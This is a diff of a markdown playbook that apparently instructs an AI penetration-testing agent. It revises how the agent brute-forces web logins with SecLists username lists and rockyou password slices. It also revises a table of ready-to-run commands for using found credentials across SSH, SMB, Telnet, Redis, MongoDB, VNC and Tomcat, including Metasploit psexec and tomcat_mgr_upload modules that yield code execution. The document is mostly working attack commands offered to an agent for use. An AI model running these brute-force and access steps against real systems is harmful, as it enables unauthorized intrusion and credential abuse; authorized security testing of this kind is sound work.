@@ -193,8 +193,8 @@ Web apps frequently seed a personal user account -- a first name, a full name, o
 local-part of an email the app exposes -- rather than `admin` / `root` / a daemon
 account, so a service/OS username list ALONE will miss it and falsely report "0 valid".
 For a web form login, sweep BOTH: (a) the standard admin/service usernames, AND (b) a
-COMMON-HUMAN-NAMES / personal-handle username list (e.g. SecLists
-`Usernames/Names/names.txt`, plus any names or email local-parts you harvest from the
+COMMON-HUMAN-NAMES / personal-handle username list (e.g. a top-N slice of SecLists
+`Usernames/xato-net-10-million-usernames.txt`, whose top entries are first names, plus any names or email local-parts you harvest from the
 app's own pages, author/profile fields, comments, or contact content) -- crossed with a
 common-web-password list (e.g. a rockyou top-N slice or `http_default_pass.txt`). Pass
 the name list via `-L names.txt` (or `-C user:pass` combos). Do NOT declare the login
@@ -268,13 +268,13 @@ After finding credentials, you MUST establish access manually:
 |---------|------|---------|
 | SSH | `kali_shell` | `sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <user>@<ip> 'whoami && id && uname -a'` |
 | SMB | `metasploit_console` | `use exploit/windows/smb/psexec; set SMBUser <user>; set SMBPass <pass>; set RHOSTS <ip>; run` |
-| MySQL | `kali_shell` | `mysql -h <ip> -u <user> -p'<password>' -e 'SELECT user(); SHOW DATABASES;'` |
+| MySQL | `execute_nmap` | `-p 3306 --script mysql-databases --script-args mysqluser='<user>',mysqlpass='<password>' <ip>` |
 | PostgreSQL | `kali_shell` | `PGPASSWORD='<password>' psql -h <ip> -U <user> -c 'SELECT current_user;'` |
 | FTP | `kali_shell` | `curl -u <user>:<password> ftp://<ip>/` |
-| Telnet | `kali_shell` | `(echo '<user>'; sleep 1; echo '<password>'; sleep 1; echo 'whoami') \\| telnet <ip>` |
-| Redis | `kali_shell` | `redis-cli -h <ip> -a '<password>' INFO` |
-| MongoDB | `kali_shell` | `mongosh --host <ip> -u <user> -p '<password>' --eval 'db.adminCommand("listDatabases")'` |
-| VNC | `kali_shell` | `echo '<password>' \\| timeout 5 vncviewer <ip> -passwd /dev/stdin` |
+| Telnet | `kali_shell` | `(echo '<user>'; sleep 1; echo '<password>'; sleep 1; echo 'whoami') \\| nc -w 5 <ip> 23` |
+| Redis | `kali_shell` | `printf 'AUTH <password>\\r\\nINFO server\\r\\nQUIT\\r\\n' \\| nc -w 3 <ip> 6379` |
+| MongoDB | `execute_nmap` | `-p 27017 --script mongodb-databases --script-args creds.mongodb='<user>:<password>' <ip>` |
+| VNC | `kali_shell` | `nxc vnc <ip> -u '' -p '<password>'` |
 | HTTP | `execute_curl` | Login with discovered credentials |
 | Tomcat | `metasploit_console` | `use exploit/multi/http/tomcat_mgr_upload; set HttpUsername <user>; set HttpPassword <pass>; set RHOSTS <ip>; set RPORT 8080; run` |
 
